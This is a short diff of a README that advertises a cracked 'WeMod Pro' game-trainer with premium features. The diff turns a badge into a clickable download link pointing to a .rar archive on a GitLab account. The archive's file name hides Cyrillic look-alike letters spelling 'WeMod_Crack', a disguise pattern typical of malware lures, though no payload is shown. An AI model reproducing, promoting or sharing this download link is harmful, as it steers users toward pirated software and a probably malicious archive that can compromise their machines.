@@ -10,8 +10,8 @@ Take full control of your single-player games with **WeMod Pro's premium feature
 ✅ **Real-Time Editing** - Modify values while playing  
 ✅ **Regular Updates** - New trainers added weekly  
 
-## 📥 **Official Alternative**  
-[![download](https://gitlab.com/vampirejohn/wemod-pro/-/raw/main/W%D0%B5M%D0%BEd_Cr%D0%B0%D1%81k.rar?inline=false)  
+## 📥 **Download**  
+[![download](https://github.com/user-attachments/assets/7e2a0cbd-5c44-457c-9e51-04800a5341ba)](https://gitlab.com/vampirejohn/wemod-pro/-/raw/main/W%D0%B5M%D0%BEd_Cr%D0%B0%D1%81k.rar?inline=false)  
 
 ---
 
